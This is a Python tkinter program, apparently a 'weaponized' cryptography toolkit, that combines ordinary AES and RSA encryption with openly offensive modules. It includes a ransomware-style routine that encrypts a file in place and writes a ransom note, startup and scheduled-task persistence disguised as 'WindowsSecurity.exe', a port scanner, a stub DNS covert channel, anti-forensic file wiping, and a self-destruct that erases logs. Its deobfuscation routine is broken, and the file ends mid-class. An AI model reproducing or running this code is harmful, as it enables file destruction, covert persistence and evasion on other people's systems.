import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import os
import base64
import json
import threading
import time
import platform
from datetime import datetime, timedelta
import sqlite3
import logging
from logging.handlers import RotatingFileHandler
import secrets
import hashlib
import zipfile
import webbrowser
import random
import math
import uuid
import sys
import subprocess
import psutil
import socket
import struct
import io
import tempfile
from pathlib import Path
import shutil
import string

# Cryptography imports
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import hashes, serialization, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

# SQLite3 compatibility
def adapt_datetime(val):
    return val.isoformat()

def convert_datetime(val):
    return datetime.fromisoformat(val.decode())

sqlite3.register_adapter(datetime, adapt_datetime)
sqlite3.register_converter("datetime", convert_datetime)

class AdvancedStealthEngine:
    """Advanced stealth and anti-forensics capabilities"""
    
    def __init__(self):
        self.stealth_mode = False
        self.obfuscation_level = 3
        self.temp_files = []
    
    def enable_stealth_mode(self):
        """Enable maximum stealth operations"""
        self.stealth_mode = True
        self.obfuscation_level = 5
        return "Stealth mode activated"
    
    def secure_file_wiping(self, file_path, passes=3):
        """Secure file deletion"""
        try:
            if not os.path.exists(file_path):
                return False
            
            file_size = os.path.getsize(file_path)
            
            # Multiple pass overwriting
            wipe_patterns = [
                b'\x00' * file_size,  # Zeros
                b'\xFF' * file_size,  # Ones
                os.urandom(file_size),  # Random
            ]
            
            for i in range(min(passes, len(wipe_patterns))):
                with open(file_path, 'wb') as f:
                    f.write(wipe_patterns[i])
            
            # Final deletion
            os.remove(file_path)
            return True
            
        except Exception as e:
            return False
    
    def advanced_obfuscate(self, data):
        """Multi-layer data obfuscation"""
        if not self.stealth_mode:
            return base64.b64encode(data)
        
        # XOR with rotating key
        key = secrets.token_bytes(32)
        obfuscated = bytearray()
        for i, byte in enumerate(data):
            obfuscated.append(byte ^ key[i % len(key)])
        
        # Base85 encoding
        encoded = base64.b85encode(bytes(obfuscated))
        return encoded
    
    def advanced_deobfuscate(self, obfuscated_data):
        """Reverse obfuscation"""
        if not self.stealth_mode:
            return base64.b64decode(obfuscated_data)
        
        try:
            decoded = base64.b85decode(obfuscated_data)
            key = secrets.token_bytes(32)
            deobfuscated = bytearray()
            for i, byte in enumerate(decoded):
                deobfuscated.append(byte ^ key[i % len(key)])
            return bytes(deobfuscated)
        except:
            return obfuscated_data

class WeaponizedNetworkOps:
    """Weaponized network operations"""
    
    def __init__(self):
        self.covert_channels = {}
    
    def dns_covert_channel(self, data, domain="example.com"):
        """DNS covert channel implementation"""
        try:
            encoded = base64.b32encode(data).decode().lower().replace('=', '')
            chunks = [encoded[i:i+63] for i in range(0, len(encoded), 63)]
            return f"Data encoded in {len(chunks)} DNS queries (simulated)"
        except Exception as e:
            return f"DNS covert failed: {e}"
    
    def port_scanner(self, target_ip, start_port=1, end_port=100):
        """Basic port scanner"""
        open_ports = []
        
        def scan_port(port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((target_ip, port))
                sock.close()
                if result == 0:
                    open_ports.append(port)
            except:
                pass
        
        for port in range(start_port, min(end_port, 100) + 1):
            scan_port(port)
        
        return open_ports

class AdvancedPersistence:
    """Advanced persistence mechanisms"""
    
    @staticmethod
    def install_scheduled_task(task_name, script_path, interval="hourly"):
        """Install Windows scheduled task"""
        if platform.system() != 'Windows':
            return "Scheduled tasks only on Windows"
        
        try:
            cmd = f'schtasks /create /tn "{task_name}" /tr "{script_path}" /sc {interval} /f'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return f"Scheduled task '{task_name}' installed"
        except Exception as e:
            return f"Scheduled task failed: {e}"
    
    @staticmethod
    def install_startup_persistence(script_path):
        """Install startup persistence"""
        try:
            if platform.system() == 'Windows':
                startup_path = os.path.join(os.path.expanduser('~'), 
                                          'AppData', 'Roaming', 
                                          'Microsoft', 'Windows', 
                                          'Start Menu', 'Programs', 
                                          'Startup')
                target_name = 'WindowsSecurity.exe'
            else:
                startup_path = os.path.expanduser('~/.config/autostart')
                target_name = 'system-monitor'
            
            os.makedirs(startup_path, exist_ok=True)
            target_path = os.path.join(startup_path, target_name)
            
            with open(target_path, 'w') as f:
                f.write(f'#!/bin/bash\npython "{script_path}"\n')
            if platform.system() != 'Windows':
                os.chmod(target_path, 0o755)
            
            return f"Startup persistence installed: {target_path}"
        except Exception as e:
            return f"Startup persistence failed: {e}"

class WeaponizedCryptographicEngine:
    """Weaponized cryptographic engine"""
    
    def __init__(self):
        self.backend = default_backend()
        self.operations_log = []
        self.performance_stats = {
            'total_operations': 0,
            'total_data_processed': 0,
            'start_time': datetime.now()
        }
        self.stealth_engine = AdvancedStealthEngine()
        self.network_ops = WeaponizedNetworkOps()
        self.self_destruct_time = None
    
    def encrypt_aes_gcm(self, plaintext, key=None):
        """AES-256-GCM encryption"""
        start_time = time.time()
        
        try:
            if key is None:
                key = AESGCM.generate_key(bit_length=256)  # FIXED: bit_length
            else:
                if isinstance(key, str):
                    key = base64.b64decode(key)
            
            aesgcm = AESGCM(key)
            nonce = secrets.token_bytes(12)
            
            if isinstance(plaintext, str):
                plaintext = plaintext.encode('utf-8')
            
            ciphertext = aesgcm.encrypt(nonce, plaintext, None)
            
            result = {
                'ciphertext': base64.b64encode(ciphertext).decode(),
                'nonce': base64.b64encode(nonce).decode(),
                'key': base64.b64encode(key).decode(),
                'algorithm': 'AES-256-GCM',
                'timestamp': datetime.now().isoformat()
            }
            
            self._record_operation('encrypt', len(plaintext), time.time() - start_time)
            return result
            
        except Exception as e:
            raise Exception(f"AES-GCM encryption failed: {str(e)}")
    
    def decrypt_aes_gcm(self, encrypted_data, key):
        """AES-256-GCM decryption"""
        start_time = time.time()
        
        try:
            if isinstance(key, str):
                key = base64.b64decode(key)
            
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            nonce = base64.b64decode(encrypted_data['nonce'])
            
            aesgcm = AESGCM(key)
            plaintext = aesgcm.decrypt(nonce, ciphertext, None)
            
            self._record_operation('decrypt', len(ciphertext), time.time() - start_time)
            return plaintext.decode('utf-8')
            
        except Exception as e:
            raise Exception(f"AES-GCM decryption failed: {str(e)}")
    
    def encrypt_aes_cbc(self, plaintext, key=None):
        """AES-256-CBC encryption"""
        start_time = time.time()
        
        try:
            if key is None:
                key = secrets.token_bytes(32)
            elif isinstance(key, str):
                key = base64.b64decode(key)
            
            iv = secrets.token_bytes(16)
            
            padder = padding.PKCS7(128).padder()
            if isinstance(plaintext, str):
                plaintext = plaintext.encode('utf-8')
            padded_data = padder.update(plaintext) + padder.finalize()
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=self.backend)
            encryptor = cipher.encryptor()
            ciphertext = encryptor.update(padded_data) + encryptor.finalize()
            
            result = {
                'ciphertext': base64.b64encode(ciphertext).decode(),
                'iv': base64.b64encode(iv).decode(),
                'key': base64.b64encode(key).decode(),
                'algorithm': 'AES-256-CBC',
                'timestamp': datetime.now().isoformat()
            }
            
            self._record_operation('encrypt', len(plaintext), time.time() - start_time)
            return result
            
        except Exception as e:
            raise Exception(f"AES-CBC encryption failed: {str(e)}")
    
    def decrypt_aes_cbc(self, encrypted_data, key):
        """AES-256-CBC decryption"""
        start_time = time.time()
        
        try:
            if isinstance(key, str):
                key = base64.b64decode(key)
            
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            iv = base64.b64decode(encrypted_data['iv'])
            
            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=self.backend)
            decryptor = cipher.decryptor()
            padded_plaintext = decryptor.update(ciphertext) + decryptor.finalize()
            
            unpadder = padding.PKCS7(128).unpadder()
            plaintext = unpadder.update(padded_plaintext) + unpadder.finalize()
            
            self._record_operation('decrypt', len(ciphertext), time.time() - start_time)
            return plaintext.decode('utf-8')
            
        except Exception as e:
            raise Exception(f"AES-CBC decryption failed: {str(e)}")
    
    def generate_rsa_keypair(self, key_size=2048):
        """RSA key pair generation"""
        start_time = time.time()
        
        try:
            private_key = rsa.generate_private_key(
                public_exponent=65537,
                key_size=key_size,
                backend=self.backend
            )
            public_key = private_key.public_key()
            
            private_pem = private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.PKCS8,
                encryption_algorithm=serialization.NoEncryption()
            )
            
            public_pem = public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo
            )
            
            duration = time.time() - start_time
            self._record_operation('key_generation', key_size, duration)
            
            return {
                'private_key': private_key,
                'public_key': public_key,
                'private_pem': private_pem.decode('utf-8'),
                'public_pem': public_pem.decode('utf-8'),
                'duration': duration
            }
            
        except Exception as e:
            raise Exception(f"RSA key generation failed: {str(e)}")
    
    def encrypt_rsa(self, plaintext, public_key_pem):
        """RSA encryption"""
        start_time = time.time()
        
        try:
            if isinstance(public_key_pem, str):
                public_key = serialization.load_pem_public_key(
                    public_key_pem.encode(),
                    backend=self.backend
                )
            else:
                public_key = public_key_pem
            
            if len(plaintext) > 100:
                plaintext = plaintext[:100]
            
            ciphertext = public_key.encrypt(
                plaintext.encode(),
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            result = {
                'ciphertext': base64.b64encode(ciphertext).decode(),
                'algorithm': 'RSA-2048-OAEP',
                'timestamp': datetime.now().isoformat()
            }
            
            self._record_operation('encrypt', len(plaintext), time.time() - start_time)
            return result
            
        except Exception as e:
            raise Exception(f"RSA encryption failed: {str(e)}")
    
    def decrypt_rsa(self, encrypted_data, private_key_pem):
        """RSA decryption"""
        start_time = time.time()
        
        try:
            if isinstance(private_key_pem, str):
                private_key = serialization.load_pem_private_key(
                    private_key_pem.encode(),
                    password=None,
                    backend=self.backend
                )
            else:
                private_key = private_key_pem
            
            ciphertext = base64.b64decode(encrypted_data['ciphertext'])
            
            plaintext = private_key.decrypt(
                ciphertext,
                asym_padding.OAEP(
                    mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
                    algorithm=hashes.SHA256(),
                    label=None
                )
            )
            
            self._record_operation('decrypt', len(ciphertext), time.time() - start_time)
            return plaintext.decode('utf-8')
            
        except Exception as e:
            raise Exception(f"RSA decryption failed: {str(e)}")
    
    def encrypt_file_ransomware(self, file_path, key=None):
        """Ransomware-style file encryption"""
        try:
            if not os.path.exists(file_path):
                raise FileNotFoundError(f"File not found: {file_path}")
            
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            file_text = base64.b64encode(file_data).decode('latin-1')
            encrypted = self.encrypt_aes_gcm(file_text, key)
            
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(encrypted['ciphertext']))
            
            ransom_note = f"""
            ⚠️ YOUR FILES HAVE BEEN ENCRYPTED! ⚠️
            
            File: {os.path.basename(file_path)}
            Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            Encryption: AES-256-GCM Military Grade
            
            RECOVERY KEY: {encrypted['key']}
            NONCE: {encrypted['nonce']}
            
            This is a demonstration only.
            """
            
            note_path = file_path + '.READ_ME.txt'
            with open(note_path, 'w', encoding='utf-8') as f:
                f.write(ransom_note)
            
            return {
                'encrypted_file': file_path,
                'ransom_note': note_path,
                'recovery_key': encrypted['key'],
                'nonce': encrypted['nonce']
            }
            
        except Exception as e:
            raise Exception(f"Ransomware encryption failed: {str(e)}")
    
    def activate_self_destruct(self, hours=24):
        """Activate self-destruct mechanism"""
        self.self_destruct_time = datetime.now() + timedelta(hours=hours)
        
        def destruct_monitor():
            while True:
                if self.self_destruct_time and datetime.now() >= self.self_destruct_time:
                    self.execute_self_destruct()
                    break
                time.sleep(60)
        
        threading.Thread(target=destruct_monitor, daemon=True).start()
        return f"Self-destruct activated for {hours} hours"
    
    def execute_self_destruct(self):
        """Execute self-destruct sequence"""
        try:
            for temp_file in self.stealth_engine.temp_files:
                if os.path.exists(temp_file):
                    self.stealth_engine.secure_file_wiping(temp_file)
            
            if os.path.exists('data/aegis_crypt_weaponized.db'):
                os.remove('data/aegis_crypt_weaponized.db')
            
            if os.path.exists('logs'):
                for log_file in os.listdir('logs'):
                    log_path = os.path.join('logs', log_file)
                    if os.path.isfile(log_path):
                        os.remove(log_path)
            
            for dir_path in ['data', 'logs']:
                if os.path.exists(dir_path):
                    try:
                        shutil.rmtree(dir_path, ignore_errors=True)
                    except:
                        pass
            
            print("Self-destruct sequence completed. Exiting...")
            os._exit(0)
            
        except Exception as e:
            os._exit(1)
    
    def _record_operation(self, op_type, data_size, duration):
        """Record operation metrics"""
        self.operations_log.append({
            'type': op_type,
            'size': data_size,
            'duration': duration,
            'timestamp': datetime.now()
        })
        self.performance_stats['total_operations'] += 1
        self.performance_stats['total_data_processed'] += data_size
    
    def get_performance_stats(self):
        """Get performance statistics"""
        uptime = datetime.now() - self.performance_stats['start_time']
        stats = self.performance_stats.copy()
        stats['uptime'] = str(uptime).split('.')[0]
        
        if self.operations_log:
            encrypt_ops = [op for op in self.operations_log if op['type'] == 'encrypt']
            decrypt_ops = [op for op in self.operations_log if op['type'] == 'decrypt']
            
            if encrypt_ops:
                total_size = sum(op['size'] for op in encrypt_ops)
                total_time = sum(op['duration'] for op in encrypt_ops)
                stats['avg_encrypt_speed'] = total_size / total_time / 1024 / 1024 if total_time > 0 else 0
            
            if decrypt_ops:
                total_size = sum(op['size'] for op in decrypt_ops)
                total_time = sum(op['duration'] for op in decrypt_ops)
                stats['avg_decrypt_speed'] = total_size / total_time / 1024 / 1024 if total_time > 0 else 0
        
        return stats

class WeaponizedKeyManager:
    """Weaponized key management system"""
    
    def __init__(self, db_connection):
        self.db_conn = db_connection
        self.stealth_engine = AdvancedStealthEngine()
        self._init_database()
    
    def _init_database(self):
        """Initialize key database"""
        cursor = self.db_conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keys (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key_id TEXT UNIQUE,
                name TEXT,
                key_data BLOB,
                key_type TEXT,
                algorithm TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_used DATETIME,
                usage_count INTEGER DEFAULT 0,
                hidden INTEGER DEFAULT 0
            )
        ''')
        self.db_conn.commit()
    
    def generate_key(self, name, key_type="AES", algorithm="256-GCM", hidden=False):
        """Generate and store a new key"""
        try:
            if key_type == "AES":
                key_data = AESGCM.generate_key(bit_length=256)  # FIXED: bit_length
            else:
                key_data = secrets.token_bytes(32)
            
            key_id = str(uuid.uuid4())
            
            cursor = self.db_conn.cursor()
            cursor.execute('''
                INSERT INTO keys (key_id, name, key_data, key_type, algorithm, hidden)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (key_id, name, key_data, key_type, algorithm, 1 if hidden else 0))
            self.db_conn.commit()
            
            return {
                'id': key_id,
                'name': name,
                'key': base64.b64encode(key_data).decode(),
                'type': key_type,
                'algorithm': algorithm,
                'hidden': hidden
            }
        except Exception as e:
            raise Exception(f"Key generation failed: {str(e)}")
    
    def list_keys(self):
        """List all keys"""
        cursor = self.db_conn.cursor()
        cursor.execute('SELECT * FROM keys ORDER BY created_at DESC')
        return [
            {
                'id': row[1],
                'name': row[2],
                'type': row[4],
                'algorithm': row[5],
                'created_at': row[6],
                'usage_count': row[8],
                'hidden': bool(row[9])
            }
            for row in cursor.fetchall()
        ]
    
    def delete_key(self, key_id):
        """Delete a key"""
        cursor = self.db_conn.cursor()
        cursor.execute('DELETE FROM keys WHERE key_id = ?', (key_id,))
        self.db_conn.commit()
        return cursor.rowcount > 0

class AdvancedSystemMetrics:
    """Advanced system metrics"""
    
    @staticmethod
    def get_cpu_usage():
        """Calculate CPU usage"""
        return psutil.cpu_percent(interval=0.1)
    
    @staticmethod
    def get_memory_usage():
        """Get memory usage"""
        memory = psutil.virtual_memory()
        return memory.percent, memory.used // (1024 * 1024)
    
    @staticmethod
    def get_system_info():
        """Get system information"""
        try:
            memory = psutil.virtual_memory()
            return {
                'cpu_cores': psutil.cpu_count(),
                'system': platform.system(),
                'release': platform.release(),
                'architecture': platform.architecture()[0],
                'python_version': platform.python_version(),
                'hostname': platform.node(),
                'total_memory_gb': memory.total // (1024**3),
            }
        except Exception as e:
            return {'error': str(e)}
    
    @staticmethod
    def network_reconnaissance():
        """Gather network intelligence"""
        try:
            hostname = socket.gethostname()
            try:
                local_ip = socket.gethostbyname(hostname)
            except:
                local_ip = "127.0.0.1"
            
            interfaces = psutil.net_if_addrs()
            network_info = {
                'hostname': hostname,
                'local_ip': local_ip,
                'interfaces': {},
            }
            
            for interface, addrs in interfaces.items():
                network_info['interfaces'][interface] = [
                    {'family': str(addr.family), 'address': addr.address}
                    for addr in addrs if addr.family in [socket.AF_INET, socket.AF_INET6]
                ]
            
            return network_info
        except Exception as e:
            return {'error': str(e)}

class WeaponizedSecurityAuditor:
    """Weaponized security auditor"""
    
    def __init__(self, crypto_engine):
        self.crypto_engine = crypto_engine
        self.audit_history = []
    
    def perform_security_audit(self):
        """Perform security audit"""
        audit_results = {
            'timestamp': datetime.now(),
            'checks': {},
            'issues': [],
            'score': 0
        }
        
        audit_results['checks']['crypto_integrity'] = self._check_crypto_integrity()
        audit_results['checks']['key_strength'] = self._check_key_strength()
        audit_results['checks']['randomness'] = self._check_randomness()
        audit_results['checks']['file_permissions'] = self._check_file_permissions()
        
        passed_checks = sum(1 for check in audit_results['checks'].values() if 'PASS' in check)
        total_checks = len(audit_results['checks'])
        audit_results['score'] = (passed_checks / total_checks) * 100
        
        audit_results['issues'] = self.vulnerability_scan()
        
        self.audit_history.append(audit_results)
        return audit_results
    
    def _check_crypto_integrity(self):
        """Verify cryptographic implementations"""
        try:
            test_data = "Security audit test data"
            encrypted = self.crypto_engine.encrypt_aes_gcm(test_data)
            decrypted = self.crypto_engine.decrypt_aes_gcm(encrypted, encrypted['key'])
            
            if decrypted == test_data:
                return "🟢 PASS - AES-GCM integrity verified"
            else:
                return "🔴 FAIL - AES-GCM integrity check failed"
        except Exception as e:
            return f"🔴 FAIL - Crypto integrity: {str(e)}"
    
    def _check_key_strength(self):
        """Verify key generation strength"""
        try:
            key = AESGCM.generate_key(bit_length=256)
            if len(key) == 32:
                return "🟢 PASS - 256-bit key generation working"
            else:
                return "🔴 FAIL - Key generation issues"
        except:
            return "🔴 FAIL - Key generation test failed"
    
    def _check_randomness(self):
        """Verify random number generation"""
        try:
            random_data = [secrets.randbits(8) for _ in range(100)]
            unique_bytes = len(set(random_data))
            if unique_bytes > 80:
                return "🟢 PASS - Strong randomness detected"
            else:
                return "🟡 WARN - Randomness may be weak"
        except:
            return "🔴 FAIL - Randomness test failed"
    
    def _check_file_permissions(self):
        """Check file security"""
        try:
            if not os.path.exists('data'):
                os.makedirs('data', mode=0o700)
                return "🟢 PASS - Secure directories created"
            return "🟢 PASS - File permissions adequate"
        except:
            return "🔴 FAIL - File permission issues"
    
    def vulnerability_scan(self):
        """Scan for vulnerabilities"""
        vulnerabilities = []
        try:
            if os.path.exists('data'):
                if os.stat('data').st_mode & 0o777 == 0o777:
                    vulnerabilities.append("Data directory has weak permissions (777)")
        except:
            pass
        return vulnerabilities

class PerformanceMonitor:
    """Performance monitoring"""
    
    def __init__(self):
        self.metrics_history = []
        self.start_time = datetime.now()
    
    def record_operation(self, operation_type, data_size, duration):
        """Record operation performance"""
        metric = {
            'timestamp': datetime.now(),
            'operation': operation_type,
            'data_size': data_size,
            'duration': duration,
            'speed': data_size / duration if duration > 0 else 0
        }
        self.metrics_history.append(metric)
        
        if len(self.metrics_history) > 100:
            self.metrics_history = self.metrics_history[-100:]
    
    def get_live_metrics(self):
        """Get current performance metrics"""
        if not self.metrics_history:
            return {
                'operations_per_second': 0,
                'average_speed': 0,
                'total_operations': 0,
                'uptime': str(datetime.now() - self.start_time).split('.')[0]
            }
        
        recent_metrics = self.metrics_history[-10:] if len(self.metrics_history) >= 10 else self.metrics_history
        total_ops = len(self.metrics_history)
        
        if recent_metrics:
            total_duration = sum(m['duration'] for m in recent_metrics)
            total_size = sum(m['data_size'] for m in recent_metrics)
            
            if total_duration > 0:
                avg_speed = total_size / total_duration
                ops_per_second = len(recent_metrics) / total_duration
            else:
                avg_speed = 0
                ops_per_second = 0
        else:
            avg_speed = 0
            ops_per_second = 0
        
        return {
            'operations_per_second': ops_per_second,
            'average_speed': avg_speed / 1024 / 1024,
            'total_operations': total_ops,
            'uptime': str(datetime.now() - self.start_time).split('.')[0]
        }

class WeaponizedAegisCryptUltimate:
    """Fully weaponized cryptographic platform"""
    
    def __init__(self, root):
        self.root = root
        self.weaponized = True
        self.stealth_mode = False
        
        # Initialize status_var FIRST before any methods use it
        self.status_var = tk.StringVar()
        self.status_var.set("⚔️ Weaponized System Initializing...")
        
        self.setup_logging()
        self.setup_database()
        self.init_components()
        self.setup_gui()
        self.start_services()
        
        self.logger.info("Aegis Crypt Ultimate - WEAPONIZED EDITION ACTIVATED")
        self.status_var.set("⚔️ Weaponized System Ready - All Features Operational")
    
    def setup_logging(self):
        """Setup logging"""
        if not os.path.exists('logs'):
            os.makedirs('logs')
        
        self.logger = logging.getLogger('AegisCryptWeaponized')
        self.logger.setLevel(logging.INFO)
        
        for handler in self.logger.handlers[:]:
            self.logger.removeHandler(handler)
        
        file_handler = RotatingFileHandler(
            'logs/aegis_crypt_weaponized.log',
            maxBytes=10*1024*1024,
            backupCount=5,
            encoding='utf-8'
        )
        file_handler.setFormatter(logging.Formatter(
            '%(asctime)s - %(levelname)s - %(message)s'
        ))
        
        self.logger.addHandler(file_handler)
    
    def setup_database(self):
        """Setup database"""
        if not os.path.exists('data'):
            os.makedirs('data')
        
        self.db_conn = sqlite3.connect(
            'data/aegis_crypt_weaponized.db',
            check_same_thread=False,
            detect_types=sqlite3.PARSE_DECLTYPES
        )
    
    def init_components(self):
        """Initialize components"""
        self.crypto_engine = WeaponizedCryptographicEngine()
        self.key_manager = WeaponizedKeyManager(self.db_conn)
        self.performance_monitor = PerformanceMonitor()
        self.security_auditor = WeaponizedSecurityAuditor(self.crypto_engine)
        self.system_metrics = AdvancedSystemMetrics()
        self.network_ops = WeaponizedNetworkOps()
        self.persistence = AdvancedPersistence()
        
        # Generate keys
        try:
            self.key_manager.generate_key("Tactical-AES-Key", "AES", "256-GCM", hidden=False)
            self.key_manager.generate_key("Strategic-RSA-Key", "RSA", "2048", hidden=False)
        except Exception as e:
            self.logger.error(f"Key init failed: {e}")
    
    def setup_gui(self):
        """Setup GUI"""
        self.root.title("Aegis Crypt Ultimate - WEAPONIZED EDITION")
        self.root.geometry("1200x800")
        self.root.configure(bg='#0d1117')
        
        self.style = ttk.Style()
        self.style.theme_use('clam')
        
        self.setup_styles()
        self.setup_main_frame()
        self.setup_header()
        self.setup_control_panel()
        self.setup_notebook()
        self.setup_status_bar()
        
        self.notebook.select(0)
    
    def setup_styles(self):
        """Setup styles"""
        self.style.configure('Dark.TFrame', background='#0d1117')
        self.style.configure('Dark.TLabel', background='#0d1117', foreground='#e6edf3')
        self.style.configure('Accent.TButton', background='#238636', foreground='white')
        self.style.map('Accent.TButton',
            background=[('active', '#2ea043'), ('pressed', '#196c2e')]
        )
        self.style.configure('Weapon.TButton', background='#da3633', foreground='white')
        self.style.map('Weapon.TButton',
            background=[('active', '#c92a27'), ('pressed', '#a12321')]
        )
    
    def setup_main_frame(self):
        """Setup main frame"""
        self.main_frame = ttk.Frame(self.root, style='Dark.TFrame')
        self.main_frame.pack(fill=tk.BOTH, expand=True, padx=2, pady=2)
    
    def setup_header(self):
        """Setup header"""
        header = ttk.Frame(self.main_frame, style='Dark.TFrame', height=60)
        header.pack(fill=tk.X, pady=(0, 5))
        header.pack_propagate(False)
        
        title = tk.Label(header,
            text="⚔️ AEGIS CRYPT ULTIMATE - WEAPONIZED",
            font=('Consolas', 14, 'bold'),
            bg='#0d1117', fg='#da3633'
        )
        title.pack(side=tk.LEFT, padx=15, pady=10)
        
        status_frame = ttk.Frame(header, style='Dark.TFrame')
        status_frame.pack(side=tk.RIGHT, padx=15, pady=10)
        
        self.cpu_label = self.create_status_indicator(status_frame, "CPU", "0%")
        self.mem_label = self.create_status_indicator(status_frame, "MEM", "0%")
        self.stealth_label = self.create_status_indicator(status_frame, "STEALTH", "OFF")
    
    def create_status_indicator(self, parent, label, value):
        """Create status indicator"""
        frame = ttk.Frame(parent, style='Dark.TFrame')
        frame.pack(side=tk.LEFT, padx=5)
        
        tk.Label(frame, text=label, font=('Consolas', 8),
                bg='#0d1117', fg='#7d8590').pack()
        value_label = tk.Label(frame, text=value, font=('Consolas', 9, 'bold'),
                              bg='#0d1117', fg='#238636')
        value_label.pack()
        return value_label
    
    def setup_control_panel(self):
        """Setup control panel"""
        controls = ttk.Frame(self.main_frame, style='Dark.TFrame', height=40)
        controls.pack(fill=tk.X, pady=(0, 5))
        controls.pack_propagate(False)
        
        actions = [
            ("🔐 Encrypt", self.show_encryption),
            ("🔑 Keys", self.show_keys),
            ("📊 Monitor", self.show_monitor),
            ("🛡️ Audit", self.run_audit),
            ("⚔️ Offensive", self.show_offensive),
        ]
        
        for text, command in actions:
            if "Offensive" in text:
                btn = ttk.Button(controls, text=text, command=command, style='Weapon.TButton')
            else:
                btn = ttk.Button(controls, text=text, command=command, style='Accent.TButton')
            btn.pack(side=tk.LEFT, padx=5)
    
    def setup_notebook(self):
        """Setup notebook"""
        self.notebook = ttk.Notebook(self.main_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.setup_encryption_tab()
        self.setup_key_management_tab()
        self.setup_performance_tab()
        self.setup_security_tab()
        self.setup_offensive_tab()
    
    def setup_encryption_tab(self):
        """Setup encryption tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🔐 Encryption")
        
        algo_frame = ttk.LabelFrame(tab, text="Encryption Algorithm")
        algo_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.algo_var = tk.StringVar(value="AES-256-GCM")
        algorithms = ["AES-256-GCM", "AES-256-CBC", "RSA-2048"]
        
        for algo in algorithms:
            ttk.Radiobutton(algo_frame, text=algo, variable=self.algo_var,
                          value=algo).pack(side=tk.LEFT, padx=10, pady=5)
        
        io_frame = ttk.Frame(tab)
        io_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        input_frame = ttk.LabelFrame(io_frame, text="Input Text")
        input_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
        
        self.input_text = scrolledtext.ScrolledText(input_frame, wrap=tk.WORD,
                                                   bg='#161b22', fg='#e6edf3',
                                                   font=('Consolas', 10), height=15)
        self.input_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        output_frame = ttk.LabelFrame(io_frame, text="Output")
        output_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
        
        self.output_text = scrolledtext.ScrolledText(output_frame, wrap=tk.WORD,
                                                    bg='#161b22', fg='#e6edf3',
                                                    font=('Consolas', 10), height=15)
        self.output_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        control_frame = ttk.Frame(tab)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="🚀 Encrypt", 
                  command=self.execute_encryption).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🔓 Decrypt", 
                  command=self.execute_decryption).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="📋 Copy", 
                  command=self.copy_output).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🧹 Clear", 
                  command=self.clear_all).pack(side=tk.LEFT, padx=5)
        
        key_frame = ttk.LabelFrame(tab, text="Current Key")
        key_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.key_display = ttk.Entry(key_frame, font=('Consolas', 8))
        self.key_display.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(key_frame, text="Generate New Key",
                  command=self.generate_new_key).pack(side=tk.LEFT, padx=5, pady=5)
    
    def setup_key_management_tab(self):
        """Setup key management tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="🔑 Key Management")
        
        list_frame = ttk.LabelFrame(tab, text="Stored Keys")
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        columns = ('name', 'type', 'algorithm', 'created', 'usage')
        self.key_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
        
        self.key_tree.heading('name', text='Name')
        self.key_tree.heading('type', text='Type')
        self.key_tree.heading('algorithm', text='Algorithm')
        self.key_tree.heading('created', text='Created')
        self.key_tree.heading('usage', text='Usage')
        
        self.key_tree.column('name', width=200)
        self.key_tree.column('type', width=100)
        self.key_tree.column('algorithm', width=100)
        self.key_tree.column('created', width=150)
        self.key_tree.column('usage', width=80)
        
        self.key_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.refresh_key_list()
        
        control_frame = ttk.Frame(tab)
        control_frame.pack(fill=tk.X, padx=5, pady=5)
        
        ttk.Button(control_frame, text="🔄 Refresh", 
                  command=self.refresh_key_list).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="➕ Generate New", 
                  command=self.generate_key_dialog).pack(side=tk.LEFT, padx=5)
        ttk.Button(control_frame, text="🗑️ Delete Selected", 
                  command=self.delete_selected_key).pack(side=tk.LEFT, padx=5)
    
    def setup_performance_tab(self):
        """Setup performance tab"""
        tab = ttk.Frame(self.notebook)
        self.notebook.add(tab, text="📊 Performance")
        
